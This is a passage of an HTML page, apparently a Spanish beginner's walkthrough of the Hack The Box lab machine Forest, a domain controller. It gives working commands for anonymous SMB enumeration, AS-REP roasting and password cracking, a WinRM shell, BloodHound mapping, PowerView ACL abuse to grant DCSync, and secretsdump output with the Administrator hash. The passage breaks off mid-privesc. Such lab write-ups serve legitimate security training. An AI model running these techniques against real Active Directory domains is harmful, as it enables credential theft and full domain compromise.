@@ -1,0 +1,462 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="referrer" content="strict-origin-when-cross-origin">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="color-scheme" content="dark">
+<meta name="theme-color" content="#0b0a1a">
+<meta name="author" content="Sebastián Latorre Muñoz">
+<title>Forest · HTB · Guía para principiantes // iphobiuss</title>
+<meta name="description" content="Writeup y guía para principiantes de la máquina Forest (Hack The Box): primer Active Directory. Enumeración anónima, AS-REP Roasting, BloodHound, abuso de ACLs (GenericAll/WriteDacl), DCSync y Pass-the-Hash. Por Sebastián Latorre Muñoz (iphobiuss).">
+<link rel="canonical" href="https://iphobiuss.github.io/forest.html">
+<meta property="og:title" content="Forest · HTB · Guía para principiantes">
+<meta property="og:description" content="Primera máquina de Active Directory: de la enumeración anónima a Domain Admin, paso a paso y razonado.">
+<meta property="og:type" content="article">
+<meta property="og:url" content="https://iphobiuss.github.io/forest.html">
+<link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' shape-rendering='crispEdges'%3E%3Crect width='24' height='24' fill='%230b0a1a'/%3E%3Cg fill='%2339ff14'%3E%3Crect x='8' y='3' width='8' height='2'/%3E%3Crect x='7' y='5' width='2' height='4'/%3E%3Crect x='15' y='5' width='2' height='4'/%3E%3Crect x='5' y='9' width='14' height='12'/%3E%3C/g%3E%3Cg fill='%230b0a1a'%3E%3Crect x='11' y='12' width='2' height='4'/%3E%3Crect x='10' y='16' width='4' height='2'/%3E%3C/g%3E%3C/svg%3E">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Press+Start+2P&family=IBM+Plex+Mono:wght@400;500;600;700&family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
+<style>
+  :root{
+    --bg:#0b0a1a; --bg2:#12102a; --panel:#0f0d24;
+    --ink:#d3d1ef; --dim:#9c97c9; --line:#2a2350;
+    --green:#39ff14; --magenta:#ff2a6d; --cyan:#05d9e8; --amber:#ffd319; --violet:#b967ff;
+    --shadow:6px 6px 0 #000;
+  }
+  *{box-sizing:border-box;}
+  html{scroll-behavior:smooth;}
+  @media (prefers-reduced-motion:reduce){html{scroll-behavior:auto;}}
+  body{margin:0;background:var(--bg);color:var(--ink);
+    font-family:'IBM Plex Mono','JetBrains Mono',monospace;font-size:15px;line-height:1.55;overflow-x:hidden;
+    background-image:radial-gradient(circle at 50% -10%, #1a1640 0%, var(--bg) 55%);}
+  .crt{position:fixed;inset:0;pointer-events:none;z-index:9000;}
+  .crt::before{content:"";position:absolute;inset:0;
+    background:repeating-linear-gradient(0deg,rgba(0,0,0,0) 0,rgba(0,0,0,0) 2px,rgba(0,0,0,.12) 3px,rgba(0,0,0,.12) 4px);}
+  .crt::after{content:"";position:absolute;inset:0;
+    background:radial-gradient(ellipse at center,transparent 62%,rgba(0,0,0,.5) 100%);}
+  @keyframes flick{0%,100%{opacity:.98}50%{opacity:1}}
+  @media (prefers-reduced-motion:no-preference){.crt{animation:flick 5s infinite steps(2);}}
+
+  .pixel{font-family:'Press Start 2P',monospace;}
+  .mono{font-family:'JetBrains Mono',monospace;}
+  a{color:var(--cyan);text-decoration:none;} a:hover{text-decoration:underline;}
+  ::selection{background:var(--green);color:#000;}
+  :focus-visible{outline:2px solid var(--green);outline-offset:2px;}
+
+  .topbar{position:sticky;top:0;z-index:100;}
+  nav{display:flex;align-items:center;gap:16px;
+    padding:12px 20px;background:var(--bg2);border-bottom:3px solid var(--line);
+    font-family:'IBM Plex Mono';font-weight:600;font-size:12px;letter-spacing:.04em;flex-wrap:wrap;}
+  nav .brand{color:var(--green);} nav .brand b{color:#fff;}
+  nav .links{display:flex;gap:13px;margin-left:auto;flex-wrap:wrap;}
+  nav .links a{color:var(--amber);} nav .links a:hover{color:#fff;text-decoration:none;}
+
+  .wrap{max-width:1040px;margin:0 auto;padding:0 22px;}
+
+  /* HERO */
+  header{padding:54px 22px 26px;}
+  .hero{max-width:1040px;margin:0 auto;}
+  .prompt{font-family:'JetBrains Mono';font-size:15px;color:var(--dim);margin-bottom:14px;}
+  .prompt .g{color:var(--green);} .prompt .c{color:var(--cyan);}
+  .hero h1{font-family:'Press Start 2P';font-size:clamp(20px,5vw,38px);color:#fff;margin:0 0 16px;
+    line-height:1.4;text-shadow:0 0 6px rgba(57,255,20,.35),4px 4px 0 rgba(0,0,0,.6);}
+  .meta{display:flex;flex-wrap:wrap;gap:8px;margin-bottom:18px;}
+  .badge{font-family:'Press Start 2P';font-size:8px;padding:7px 9px;border:2px solid var(--line);
+    background:var(--panel);box-shadow:3px 3px 0 #000;}
+  .badge.b1{color:var(--green);border-color:var(--green);}
+  .badge.b2{color:var(--cyan);border-color:var(--cyan);}
+  .badge.b3{color:var(--amber);border-color:var(--amber);}
+  .badge.b4{color:var(--magenta);border-color:var(--magenta);}
+  .badge.b5{color:var(--violet);border-color:var(--violet);}
+  .pitch{font-family:'IBM Plex Mono';font-size:14.5px;line-height:1.7;color:var(--ink);margin:16px 0 0;max-width:70ch;}
+  .pitch b{color:var(--amber);}
+
+  /* CHAIN badges */
+  .chain{display:flex;flex-wrap:wrap;gap:0;align-items:stretch;margin:26px auto 0;max-width:1040px;}
+  .chain .lnk{flex:1;min-width:120px;background:var(--panel);border:2px solid var(--line);
+    border-top:4px solid var(--acc,var(--green));padding:11px 13px;box-shadow:4px 4px 0 #000;margin:0 8px 8px 0;}
+  .chain .lnk .n{font-family:'Press Start 2P';font-size:8px;color:var(--acc,var(--green));margin-bottom:7px;}
+  .chain .lnk .t{font-size:12.5px;color:var(--ink);line-height:1.4;}
+  .chain .lnk .t b{color:#fff;font-weight:400;}
+
+  /* INTRO / callouts */
+  .intro{max-width:1040px;margin:28px auto 0;padding:0 22px;color:var(--ink);font-size:15.5px;line-height:1.62;}
+  .intro b{color:var(--amber);}
+  .intro .mono{font-size:.9em;background:#060512;border:1px solid var(--line);padding:1px 6px;color:var(--cyan);}
+
+  /* SECTIONS */
+  section{padding:48px 0 10px;border-top:3px solid var(--line);margin-top:42px;}
+  .sec-head{display:flex;align-items:baseline;gap:14px;flex-wrap:wrap;margin-bottom:6px;}
+  .sec-id{font-family:'Press Start 2P';font-size:20px;color:var(--acc);}
+  .sec-name{font-family:'Press Start 2P';font-size:clamp(12px,3.2vw,17px);color:#fff;margin:0;font-weight:400;line-height:1.5;}
+  .sec-focus{font-size:15px;color:var(--acc);margin:6px 0 22px;}
+  .sec-focus::before{content:"▸ ";}
+
+  h3.step{font-family:'IBM Plex Mono';font-weight:700;font-size:14px;color:#fff;
+    letter-spacing:.03em;margin:24px 0 10px;padding-left:12px;border-left:4px solid var(--acc,var(--cyan));}
+  p.f{font-size:15px;line-height:1.64;margin:0 0 14px;color:var(--ink);}
+  p.f b{color:#fff;}
+  .why{border-left:3px solid var(--amber);background:rgba(255,211,25,.05);padding:12px 15px;margin:0 0 14px;font-size:14.5px;line-height:1.6;}
+  .why b{font-family:'IBM Plex Mono';font-weight:700;font-size:11px;letter-spacing:.06em;color:var(--amber);display:block;margin-bottom:6px;}
+
+  .cmdlabel{font-family:'IBM Plex Mono';font-weight:700;font-size:11px;letter-spacing:.06em;color:var(--cyan);margin:12px 0 8px;}
+  pre{font-family:'JetBrains Mono',monospace;font-size:13px;line-height:1.65;
+    background:#060512;border:2px solid var(--line);color:#d7f7d0;
+    padding:13px 15px;overflow-x:auto;margin:0 0 12px;}
+  pre .cmt{color:#8a84bd;} pre .k{color:var(--cyan);} pre .o{color:var(--amber);}
+  code.ic{background:#060512;border:1px solid var(--line);padding:1px 6px;color:var(--cyan);font-size:.9em;}
+
+  /* fundamento card */
+  .fcard{background:var(--panel);border:2px solid var(--line);border-left:5px solid var(--violet);
+    padding:16px 18px;margin:0 0 14px;box-shadow:4px 4px 0 #000;}
+  .fcard h4{font-family:'IBM Plex Mono';font-weight:700;font-size:14px;color:var(--violet);margin:0 0 10px;line-height:1.5;}
+  .fcard p{margin:0 0 10px;font-size:15px;line-height:1.6;}
+  .fcard p:last-child{margin-bottom:0;}
+  .fcard.cyan{border-left-color:var(--cyan);} .fcard.cyan h4{color:var(--cyan);}
+  .fcard.green{border-left-color:var(--green);} .fcard.green h4{color:var(--green);}
+  .fcard.amber{border-left-color:var(--amber);} .fcard.amber h4{color:var(--amber);}
+  .fcard.magenta{border-left-color:var(--magenta);} .fcard.magenta h4{color:var(--magenta);}
+
+  /* tables */
+  .tblwrap{overflow-x:auto;margin:0 0 14px;}
+  table{border-collapse:collapse;width:100%;font-size:13.5px;background:var(--panel);box-shadow:4px 4px 0 #000;}
+  th,td{border:1px solid var(--line);padding:9px 12px;text-align:left;vertical-align:top;line-height:1.5;}
+  th{font-family:'IBM Plex Mono';font-weight:700;font-size:11px;letter-spacing:.05em;color:var(--cyan);background:#060512;}
+  td code,th code{background:#060512;border:1px solid var(--line);padding:1px 5px;color:var(--cyan);font-size:12px;}
+  td b{color:#fff;}
+  .ans{color:var(--green);font-weight:700;}
+
+  /* graph path */
+  .path{background:#060512;border:2px solid var(--violet);padding:16px 18px;margin:0 0 14px;
+    box-shadow:4px 4px 0 #000;font-family:'JetBrains Mono',monospace;font-size:13px;line-height:2;overflow-x:auto;}
+  .path .node{color:var(--green);font-weight:700;}
+  .path .rel{color:var(--amber);}
+  .path .arrow{color:var(--dim);}
+
+  .warn{border:3px dashed var(--magenta);background:rgba(255,42,109,.06);
+    padding:16px 18px;margin:34px 0;color:var(--magenta);font-size:14.5px;line-height:1.55;}
+  .warn b{font-family:'IBM Plex Mono';font-weight:700;font-size:12px;letter-spacing:.04em;display:block;margin-bottom:8px;}
+  .warn .mono{color:var(--amber);}
+
+  .takeaways{list-style:none;padding:0;margin:6px 0 0;}
+  .takeaways li{background:var(--panel);border:1px solid var(--line);border-left:4px solid var(--green);
+    padding:11px 14px;margin:0 0 9px;font-size:14.5px;line-height:1.55;}
+  .takeaways li b{color:var(--green);}
+
+  footer{border-top:3px solid var(--line);margin-top:44px;padding:34px 22px 60px;text-align:center;
+    font-family:'IBM Plex Mono';font-weight:600;font-size:11px;letter-spacing:.03em;color:var(--dim);line-height:2.4;}
+  footer .g{color:var(--green);} footer a{color:var(--cyan);display:inline-block;padding:5px 7px;}
+
+  .skip{position:absolute;left:8px;top:-52px;z-index:200;background:var(--green);color:#000;
+    padding:9px 15px;font-family:'IBM Plex Mono';font-weight:700;font-size:13px;border:2px solid #000;transition:top .12s;}
+  .skip:focus{top:8px;text-decoration:none;}
+
+  @media (max-width:640px){
+    nav{flex-wrap:nowrap;gap:0;padding:0 14px;overflow-x:auto;scrollbar-width:none;}
+    nav::-webkit-scrollbar{display:none;}
+    nav .brand{flex-shrink:0;padding:13px 16px 13px 0;}
+    nav .links{flex-wrap:nowrap;margin-left:0;gap:0;}
+    nav .links a{padding:13px 9px;white-space:nowrap;}
+  }
+
+  /* impresión / guardar como PDF */
+  @media print{
+    .crt,.topbar,.skip{display:none!important;}
+    body{background:#fff!important;background-image:none!important;font-size:11pt;}
+    *{box-shadow:none!important;text-shadow:none!important;color:#111!important;
+      background:transparent!important;border-color:#bbb!important;}
+    a{text-decoration:underline;}
+    pre,.path{background:#f3f3f3!important;border:1px solid #ccc!important;white-space:pre-wrap;word-break:break-word;}
+    pre .cmt,pre .k,pre .o,.path .node,.path .rel,.path .arrow{color:#333!important;}
+    table{background:#fff!important;} th{background:#eee!important;}
+    .badge,.fcard,.warn,.chain .lnk,pre,table,.why,.takeaways li,.path{break-inside:avoid;}
+    .ans{color:#111!important;}
+  }
+</style>
+</head>
+<body>
+<a class="skip" href="#contenido">Saltar al contenido</a>
+<div class="crt"></div>
+
+<div class="topbar">
+<nav aria-label="Navegación">
+  <span class="brand"><b>iphobiuss</b>::offsec</span>
+  <span class="links">
+    <a href="index.html">← KNOWLEDGE BASE</a>
+    <a href="knife.html">KNIFE</a>
+    <a href="#recon">RECON</a><a href="#enum">ENUM</a><a href="#asrep">AS-REP</a>
+    <a href="#foothold">FOOTHOLD</a><a href="#bloodhound">BLOODHOUND</a><a href="#privesc">PRIVESC</a><a href="#tasks">TASKS</a><a href="#takeaways">TAKEAWAYS</a>
+  </span>
+</nav>
+</div>
+
+<main id="contenido">
+<header>
+  <div class="hero">
+    <div class="prompt mono"><span class="g">iphobiuss@offsec</span>:<span class="c">~</span>$ ./pwn --box forest --domain htb.local</div>
+    <h1 class="pixel">FOREST</h1>
+    <div class="meta">
+      <span class="badge b1">HTB</span>
+      <span class="badge b2">WINDOWS</span>
+      <span class="badge b3">EASY</span>
+      <span class="badge b4">ACTIVE DIRECTORY</span>
+      <span class="badge b5">DCSYNC</span>
+    </div>
+    <p class="pitch">Guía para principiantes de <b>Forest</b>, la <b>#3</b> de la serie y la <b>primera de Active Directory</b>. Cambia el paradigma respecto a <a href="cap.html">Cap</a> y <a href="knife.html">Knife</a>: aquí no hay web ni exploit de servicio — es un ataque de dominio completo. De la enumeración anónima a <b>Domain Admin</b>, razonando cada salto. Si es tu primera AD, es normal sentirse perdido al inicio: AD es otro mundo, y esta guía te lleva de la mano por él.</p>
+
+    <div class="chain">
+      <div class="lnk" style="--acc:var(--cyan)"><div class="n">01</div><div class="t"><b>RECON</b><br>DC · 23 puertos</div></div>
+      <div class="lnk" style="--acc:var(--amber)"><div class="n">02</div><div class="t"><b>ENUM</b><br>SMB anónimo · 31 users</div></div>
+      <div class="lnk" style="--acc:var(--magenta)"><div class="n">03</div><div class="t"><b>AS-REP</b><br>roast → crack → s3rvice</div></div>
+      <div class="lnk" style="--acc:var(--green)"><div class="n">04</div><div class="t"><b>FOOTHOLD</b><br>WinRM → svc-alfresco</div></div>
+      <div class="lnk" style="--acc:var(--cyan)"><div class="n">05</div><div class="t"><b>BLOODHOUND</b><br>mapa del dominio</div></div>
+      <div class="lnk" style="--acc:var(--violet)"><div class="n">06</div><div class="t"><b>PRIVESC</b><br>ACLs → DCSync → PtH</div></div>
+    </div>
+  </div>
+</header>
+
+<div class="intro">
+  <b>Requisitos:</b> cuenta HTB (VIP para retiradas), Kali, y la VPN levantada (una a la vez — <span class="mono">sudo pkill openvpn</span> antes de reconectar, como en <a href="knife.html">Knife</a>).
+  <br><br>
+  <b>Herramientas nuevas que usa esta máquina:</b> <span class="mono">netexec</span>, <span class="mono">impacket-GetNPUsers</span>, <span class="mono">john</span>, <span class="mono">evil-winrm</span>, <span class="mono">bloodhound-python</span> + <span class="mono">BloodHound CE</span>, <span class="mono">PowerView</span>, <span class="mono">impacket-secretsdump</span>. Todas vienen en Kali. En esta guía la IP objetivo es <span class="mono">10.129.62.145</span> y la IP del atacante (tun0) <span class="mono">10.10.14.57</span>; las tuyas serán distintas.
+</div>
+
+<!-- ===================== RECON ===================== -->
+<section id="recon" style="--acc:var(--cyan)">
+  <div class="wrap">
+    <div class="sec-head"><span class="sec-id">▚</span><h2 class="sec-name">01 · RECONOCIMIENTO DE UN DC</h2></div>
+    <div class="sec-focus">23 puertos no asustan: son la huella de un Domain Controller.</div>
+
+    <div class="fcard cyan">
+      <h4>▚ Dominio y Domain Controller</h4>
+      <p>Un <b>dominio</b> gestiona de forma centralizada muchos equipos y usuarios bajo un mismo paraguas (la cuenta corporativa con la que inicia sesión toda una empresa). El <b>Domain Controller (DC)</b> es el servidor que manda: guarda todas las cuentas, contraseñas, grupos y permisos, y autentica a todos. <b>Forest es un DC.</b> Comprometer un DC es comprometer el dominio entero — por eso es el objetivo más goloso.</p>
+    </div>
+
+    <h3 class="step">Barrido y detección</h3>
+    <pre><span class="k">mkdir</span> -p ~/htb/forest/nmap &amp;&amp; <span class="k">cd</span> ~/htb/forest
+<span class="k">nmap</span> -p- --min-rate 1000 -oA nmap/allports 10.129.62.145
+<span class="k">nmap</span> -sCV -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389 -oA nmap/detail 10.129.62.145</pre>
+    <div class="why"><b>EL TTL DELATA EL SO</b>El ping devolvía <code class="ic">ttl=127</code>. Windows parte su TTL en 128 (baja 1 por salto); Linux en 64. Así que <code class="ic">ttl=127</code> = <b>Windows</b>, antes de tocar nada. Coherente: AD es tecnología Microsoft.</div>
+
+    <h3 class="step">Leer un DC de un vistazo</h3>
+    <p class="f">A diferencia de Cap (3 puertos) y Knife (2), un DC devuelve <b>23</b>. Los <code class="ic">4966x/4967x</code> son RPC dinámico (ruido). Los que importan forman la huella de AD:</p>
+    <div class="tblwrap"><table>
+      <tr><th>Puerto</th><th>Servicio</th><th>Qué significa</th></tr>
+      <tr><td><code>88</code></td><td>Kerberos</td><td>⭐ La estrella. El sistema de autenticación de AD. Verlo = hay dominio Windows. La técnica de Forest lo ataca.</td></tr>
+      <tr><td><code>389 / 636</code></td><td>LDAP / LDAPS</td><td>La "guía telefónica" del dominio: usuarios, grupos, permisos. Clave para enumerar. Permite <em>anonymous bind</em>.</td></tr>
+      <tr><td><code>445</code></td><td>SMB</td><td>Comparticiones Windows. Aquí acepta sesión nula (<code>guest</code>).</td></tr>
+      <tr><td><code>53</code></td><td>DNS</td><td>El DC también es el DNS del dominio.</td></tr>
+      <tr><td><code>5985 / 47001</code></td><td>WinRM</td><td>⭐ Administración remota. Con credenciales, tu vía a una shell (el "SSH de Windows").</td></tr>
+    </table></div>
+    <p class="f">El <code class="ic">-sCV</code> revela el nombre del dominio, repetido por todas partes: <b>Domain: htb.local</b>, <code class="ic">FQDN: FOREST.htb.local</code>, Windows Server 2016. Y una perla en el script de SMB: <code class="ic">account_used: guest</code> → acepta acceso anónimo.</p>
+
+    <h3 class="step">Mapear el dominio en /etc/hosts (obligatorio en AD)</h3>
+    <p class="f">Muchas herramientas de AD (sobre todo las de Kerberos) fallan si les hablas por IP: necesitan el <b>nombre</b>. Enséñale a Kali a resolver el dominio:</p>
+    <pre><span class="k">sudo</span> sh -c 'echo "10.129.62.145 htb.local forest.htb.local FOREST" &gt;&gt; /etc/hosts'
+<span class="k">ping</span> -c 2 forest.htb.local   <span class="cmt"># debe resolver el nombre a la IP</span></pre>
+    <div class="why"><b>REGLA DE AD</b>Mapear el dominio en <code class="ic">/etc/hosts</code> es obligatorio en toda máquina de AD. Y un dominio por vez: limpia entradas viejas de otros labs para no confundirte.</div>
+  </div>
+</section>
+
+<!-- ===================== ENUM ===================== -->
+<section id="enum" style="--acc:var(--amber)">
+  <div class="wrap">
+    <div class="sec-head"><span class="sec-id">▚</span><h2 class="sec-name">02 · ENUMERACIÓN ANÓNIMA</h2></div>
+    <div class="sec-focus">Sin credenciales, pero el dominio ya nos habla.</div>
+
+    <div class="fcard amber">
+      <h4>▚ SMB y por qué el acceso anónimo importa</h4>
+      <p><b>SMB</b> es el protocolo de Windows para compartir archivos y recursos en red. Cuando permite acceso <b>anónimo/guest</b>, puedes preguntarle cosas sin credenciales — entre ellas, a veces, <b>la lista de usuarios del dominio</b>. Y conseguir esa lista es el primer gran paso en AD: necesitas saber <em>a quién</em> atacar.</p>
+    </div>
+
+    <h3 class="step">Confirmar sesión nula y sacar usuarios</h3>
+    <pre><span class="k">netexec</span> smb 10.129.62.145 -u '' -p ''            <span class="cmt"># (Null Auth:True) = acepta anónimo</span>
+<span class="k">netexec</span> smb 10.129.62.145 -u '' -p '' --users    <span class="cmt"># lista los usuarios del dominio</span></pre>
+    <p class="f">El <code class="ic">--users</code> devuelve <b>31 usuarios</b>. La habilidad clave es separar el grano de la paja:</p>
+    <div class="tblwrap"><table>
+      <tr><th>Ruido (ignorar)</th><th>Grano (personas / cuentas reales)</th></tr>
+      <tr><td><code>Administrator</code>, <code>Guest</code>, <code>krbtgt</code>, <code>DefaultAccount</code> (integradas) · <code>SM_*</code>, <code>HealthMailbox*</code>, <code>$*</code> (cuentas de Exchange, autogeneradas)</td><td><code>sebastien</code>, <code>lucinda</code>, <code>andy</code>, <code>mark</code>, <code>santi</code>, y <b><code>svc-alfresco</code></b></td></tr>
+    </table></div>
+    <div class="why"><b>EL PREFIJO svc-</b><code class="ic">svc-alfresco</code> salta a la vista: <code class="ic">svc-</code> = <em>service account</em> (cuenta de servicio, no persona). Las cuentas de servicio suelen estar peor configuradas — contraseñas débiles y, a menudo, la debilidad de Kerberos que vamos a explotar.</div>
+
+    <p class="f">Guarda los usuarios-persona en un archivo (los necesitarás):</p>
+    <pre><span class="k">echo</span> 'sebastien
+lucinda
+andy
+mark
+santi
+svc-alfresco' &gt; users.txt</pre>
+  </div>
+</section>
+
+<!-- ===================== AS-REP ===================== -->
+<section id="asrep" style="--acc:var(--magenta)">
+  <div class="wrap">
+    <div class="sec-head"><span class="sec-id">▚</span><h2 class="sec-name">03 · AS-REP ROASTING + CRACKING</h2></div>
+    <div class="sec-focus">Pedir el hash de un usuario sin autenticarte, y romperlo offline.</div>
+
+    <div class="fcard magenta">
+      <h4>▚ AS-REP Roasting</h4>
+      <p>Normalmente Kerberos exige <b>pre-autenticarte</b> antes de darte información. Pero existe una opción de cuenta, <b>"no requiere pre-autenticación"</b>, que si está activada hace que Kerberos te entregue información cifrada <b>sin autenticarte</b>. Esa información contiene algo derivado de la <b>contraseña</b> del usuario. Si la capturas, la crackeas offline.</p>
+      <p><b>AS-REP Roasting</b> = pedirle a Kerberos el hash de un usuario con la pre-autenticación desactivada, para romperlo. Las cuentas <code class="ic">svc-</code> son candidatas frecuentes.</p>
+    </div>
+
+    <h3 class="step">Pedir los hashes</h3>
+    <pre><span class="k">impacket-GetNPUsers</span> htb.local/ -no-pass -usersfile users.txt</pre>
+    <p class="f">Los cinco usuarios-persona responden <code class="ic">doesn't have UF_DONT_REQUIRE_PREAUTH set</code> (bien configurados). Pero <b>svc-alfresco</b> suelta el premio — un hash <code class="ic">$krb5asrep$...</code>. Guárdalo:</p>
+    <pre><span class="k">impacket-GetNPUsers</span> htb.local/ -no-pass -usersfile users.txt | grep '\$krb5asrep\$' &gt; hash.txt</pre>
+
+    <h3 class="step">Crackear offline</h3>
+    <p class="f">El hash es una representación cifrada de la contraseña. Se rompe <b>offline</b> (en tu Kali, sin tocar la víctima, intentos ilimitados) probando un diccionario. hashcat es lo estándar… pero en una VM sin GPU falla:</p>
+    <pre><span class="k">hashcat</span> -m 18200 hash.txt rockyou.txt   <span class="cmt"># ✗ No OpenCL/CUDA platform found (VM sin GPU)</span>
+<span class="k">john</span> --wordlist=/usr/share/wordlists/rockyou.txt hash.txt   <span class="cmt"># ✓ detecta el tipo solo</span></pre>
+    <p class="f">John lo rompe en un segundo: <b><code class="ic">svc-alfresco : s3rvice</code></b>.</p>
+    <div class="why"><b>hashcat vs john</b>hashcat brilla con GPU; en una VM sin GPU, <b>john</b> es tu herramienta de cracking (usa CPU sin quejarse y autodetecta el tipo de hash). Ten ambas en el arsenal.</div>
+  </div>
+</section>
+
+<!-- ===================== FOOTHOLD ===================== -->
+<section id="foothold" style="--acc:var(--green)">
+  <div class="wrap">
+    <div class="sec-head"><span class="sec-id">▚</span><h2 class="sec-name">04 · FOOTHOLD · WINRM</h2></div>
+    <div class="sec-focus">De anónimo a usuario autenticado del dominio.</div>
+
+    <h3 class="step">Validar credenciales (reflejo obligatorio en AD)</h3>
+    <p class="f">Antes de usar unas credenciales nuevas, compruébalas. Y verifica si sirven para WinRM:</p>
+    <pre><span class="k">netexec</span> smb 10.129.62.145 -u svc-alfresco -p s3rvice    <span class="cmt"># [+] = válidas</span>
+<span class="k">netexec</span> winrm 10.129.62.145 -u svc-alfresco -p s3rvice  <span class="cmt"># (Pwn3d!) = puede entrar por WinRM</span></pre>
+
+    <h3 class="step">Conseguir shell</h3>
+    <p class="f"><b>evil-winrm</b> es el "SSH de Windows": administración remota que da una terminal PowerShell con credenciales válidas.</p>
+    <pre><span class="k">evil-winrm</span> -i 10.129.62.145 -u svc-alfresco -p s3rvice</pre>
+    <p class="f">Caes en <code class="ic">*Evil-WinRM* PS C:\Users\svc-alfresco\Documents&gt;</code>. Estás dentro del DC como svc-alfresco.</p>
+
+    <h3 class="step">User flag</h3>
+    <p class="f">En Windows la flag está en el <b>Desktop</b>, no en <code class="ic">/home</code>. Comandos de PowerShell: <code class="ic">cd</code>, <code class="ic">dir</code> (el <code class="ic">ls</code>), <code class="ic">type</code> (el <code class="ic">cat</code>).</p>
+    <pre><span class="k">cd</span> C:\Users\svc-alfresco\Desktop
+<span class="k">type</span> user.txt   <span class="cmt"># -&gt; 8a961daab9f55e5a4a4a738aa69b0434</span></pre>
+  </div>
+</section>
+
+<!-- ===================== BLOODHOUND ===================== -->
+<section id="bloodhound" style="--acc:var(--cyan)">
+  <div class="wrap">
+    <div class="sec-head"><span class="sec-id">▚</span><h2 class="sec-name">05 · BLOODHOUND</h2></div>
+    <div class="sec-focus">La escalada en AD es sobre relaciones y permisos, no sobre un binario.</div>
+
+    <div class="fcard cyan">
+      <h4>▚ ¿Qué es BloodHound?</h4>
+      <p>Recolecta toda la información del dominio (usuarios, grupos, permisos, relaciones) y la dibuja como un <b>grafo</b>. Su magia: calcula el <b>camino más corto</b> desde donde estás hasta Domain Admin, mostrando qué permiso abusar en cada paso. En un dominio real con miles de objetos, encontrar ese camino a mano es imposible.</p>
+    </div>
+
+    <h3 class="step">Recolectar (desde Kali)</h3>
+    <pre><span class="k">bloodhound-python</span> -d htb.local -u svc-alfresco -p s3rvice -ns 10.129.62.145 -c All --zip</pre>
+    <p class="f"><code class="ic">-ns</code> es el DNS (el propio DC), <code class="ic">-c All</code> recolecta todo, <code class="ic">--zip</code> empaqueta. Genera un <code class="ic">.zip</code>. Warnings a ignorar: los <code class="ic">Kerberos → NTLM fallback</code> (recolecta igual por NTLM) y el <code class="ic">clock skew</code> (si algún día bloquea algo crítico: <code class="ic">sudo ntpdate 10.129.62.145</code>).</p>
+
+    <h3 class="step">Analizar (BloodHound CE)</h3>
+    <pre><span class="k">bloodhound-start</span>   <span class="cmt"># Web UI: http://127.0.0.1:8080  ·  admin/admin</span></pre>
+    <p class="f">En la interfaz, <b>Quick Upload</b> tu <code class="ic">.zip</code>, espera el procesado, y busca <code class="ic">svc-alfresco</code> para confirmar que cargó. En <b>Pathfinding</b>: origen <code class="ic">svc-alfresco</code>, destino <code class="ic">Exchange Windows Permissions</code>. El grafo:</p>
+    <div class="path"><span class="node">svc-alfresco</span> <span class="rel">─MemberOf→</span> <span class="node">Service Accounts</span> <span class="rel">─MemberOf→</span> <span class="node">Privileged IT Accounts</span> <span class="rel">─MemberOf→</span> <span class="node">Account Operators</span> <span class="rel">─GenericAll→</span> <span class="node">Exchange Windows Permissions</span> <span class="rel">─WriteDacl→</span> <span class="node">HTB.LOCAL</span></div>
+    <p class="f">Traducción: por su cadena de grupos, svc-alfresco llega a <b>Account Operators</b>, que tiene <b>GenericAll</b> (control total) sobre <b>Exchange Windows Permissions</b>, y ese grupo tiene <b>WriteDacl</b> sobre el <b>dominio entero</b>. Ese es el camino a Domain Admin.</p>
+  </div>
+</section>
+
+<!-- ===================== PRIVESC ===================== -->
+<section id="privesc" style="--acc:var(--violet)">
+  <div class="wrap">
+    <div class="sec-head"><span class="sec-id">▚</span><h2 class="sec-name">06 · ACLs → DCSYNC → PASS-THE-HASH</h2></div>
+    <div class="sec-focus">Tres movimientos que convierten permisos en Domain Admin.</div>
+
+    <div class="fcard">
+      <h4>▚ Los permisos que vamos a abusar</h4>
+      <p><b>GenericAll</b> = control total sobre un objeto (puedes, por ejemplo, agregarte a un grupo). <b>WriteDacl</b> = puedes modificar la lista de permisos (DACL) de un objeto — y así <em>concederte a ti mismo</em> nuevos derechos. <b>DCSync</b> = abusar de la replicación entre DCs para pedirle al DC todos los hashes de contraseñas del dominio, como si fueras otro DC.</p>
+    </div>
+
+    <h3 class="step">Preparar PowerView (vía evil-winrm)</h3>
+    <pre><span class="cmt"># en Kali:</span>
+<span class="k">cp</span> /usr/share/windows-resources/powersploit/Recon/PowerView.ps1 ~/htb/forest/
+<span class="cmt"># en la sesión evil-winrm:</span>
+upload /home/iphobiuss/htb/forest/PowerView.ps1
+. .\PowerView.ps1                <span class="cmt"># dot-sourcing: carga las funciones (silencio = ok)</span></pre>
+
+    <h3 class="step">Movimiento 1 · Agregarte al grupo (GenericAll)</h3>
+    <pre><span class="k">Add-DomainGroupMember</span> -Identity 'Exchange Windows Permissions' -Members 'svc-alfresco'
+<span class="k">Get-DomainGroupMember</span> -Identity 'Exchange Windows Permissions' | Select-Object MemberName</pre>
+    <p class="f">La verificación muestra <code class="ic">svc-alfresco</code> como miembro. Ya perteneces al grupo con WriteDacl sobre el dominio.</p>
+
+    <h3 class="step">Movimiento 2 · Concederte DCSync (WriteDacl)</h3>
+    <pre>$pass = ConvertTo-SecureString 's3rvice' -AsPlainText -Force
+$cred = New-Object System.Management.Automation.PSCredential('htb\svc-alfresco', $pass)
+<span class="k">Add-DomainObjectAcl</span> -Credential $cred -TargetIdentity 'DC=htb,DC=local' -PrincipalIdentity 'svc-alfresco' -Rights DCSync</pre>
+    <div class="why"><b>TIMING</b>La pertenencia al grupo tarda unos segundos en propagarse. Si el Movimiento 2 da error de permisos, espera 10-15 s y reintenta.</div>
+
+    <h3 class="step">Movimiento 3 · DCSync (desde Kali)</h3>
+    <pre><span class="k">impacket-secretsdump</span> htb.local/svc-alfresco:s3rvice@10.129.62.145</pre>
+    <p class="f">El <code class="ic">rpc_s_access_denied</code> inicial es un método secundario — se ignora, porque debajo vuelca <b>todos los hashes del dominio</b>. La línea que importa (RID <code class="ic">500</code> = Administrator):</p>
+    <pre>htb.local\Administrator:500:aad3b435...:<span class="o">32693b11e6aa90eb43d32c72a07ceea6</span>:::</pre>
+
